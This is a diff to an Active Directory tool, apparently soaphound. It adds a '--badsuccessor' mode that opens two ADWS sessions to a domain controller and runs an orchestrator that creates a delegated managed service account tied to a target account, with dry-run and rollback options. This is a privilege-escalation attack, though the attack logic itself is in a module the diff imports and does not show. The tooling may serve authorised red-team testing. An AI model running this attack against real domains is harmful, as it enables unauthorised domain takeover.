@@ -251,6 +251,60 @@ def main():
             success = True
             return
 
+        # BadSuccessor via ADWS dispatch (v1.5.0). Short-circuits the whole
+        # BloodHound collect pipeline. The orchestrator keeps its own
+        # Resource client so the flow stays independent of the enumeration
+        # session the collectors use below. See README section
+        # "BadSuccessor via ADWS" and the design doc.
+        if getattr(options, "badsuccessor", False):
+            from soaphound.attacks.badsuccessor import BadSuccessorOrchestrator
+
+            required = [
+                ("--dmsa-cn", options.dmsa_cn),
+                ("--dmsa-ou", options.dmsa_ou),
+            ]
+            if not options.rollback:
+                required.insert(0, ("--target", options.target))
+            missing = [name for name, val in required if not val]
+            if missing:
+                logging.critical(
+                    "--badsuccessor requires %s.", ", ".join(missing),
+                )
+                sys.exit(1)
+
+            dc_fqdn = _resolve_dc_fqdn(options.domain_controller)
+            # Two parallel ADWS sessions: ResourceFactory for Op 1 (Create)
+            # and Resource for Op 2 / Op 3 (Put) and rollback (Delete). Each
+            # endpoint has its own WCF binding on net.tcp:9389, so a Create
+            # cannot ride on a Resource-bound session (AddressFilter mismatch
+            # DestinationUnreachable fault).
+            bs_client = ADWSConnect.put_client(
+                dc_fqdn, options.domain, options.username, auth,
+            )
+            rf_client = ADWSConnect.create_client(
+                dc_fqdn, options.domain, options.username, auth,
+            )
+            try:
+                orchestrator = BadSuccessorOrchestrator(
+                    nmf_client=rf_client._nmf,            # ResourceFactory, Op 1 Create
+                    rollback_nmf_client=bs_client._nmf,   # Resource, rollback Delete
+                    adws_connect=bs_client,               # Resource, Op 2 and Op 3 Put
+                    dc_fqdn=dc_fqdn,
+                    target_dn=options.target,
+                    dmsa_cn=options.dmsa_cn,
+                    dmsa_ou=options.dmsa_ou,
+                    dry_run=getattr(options, "dry_run", False),
+                    rollback=getattr(options, "rollback", False),
+                )
+                ok = orchestrator.run()
+            except Exception as exc:
+                print(f"[-] BadSuccessor failed: {exc}")
+                sys.exit(1)
+            if not ok:
+                sys.exit(1)
+            success = True
+            return
+
         # 1. RootDSE query (Resource)
         adws_resource = ADWSConnect(options.domain_controller, options.domain, options.username, auth, "Resource")
         contexts = adws_resource.get_rootdse_contexts(adws_resource._fqdn, adws_resource._nmf)
